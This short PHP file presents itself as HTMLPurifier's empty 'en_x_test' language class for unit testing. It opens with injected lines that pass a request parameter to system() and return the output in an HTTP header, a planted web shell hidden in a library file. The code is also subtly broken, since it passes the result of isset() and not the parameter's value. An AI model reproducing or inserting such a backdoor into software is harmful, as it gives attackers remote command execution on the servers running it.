<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

// private class for unit testing

class HTMLPurifier_Language_en_x_test extends HTMLPurifier_Language
{
}

// vim: et sw=4 sts=4
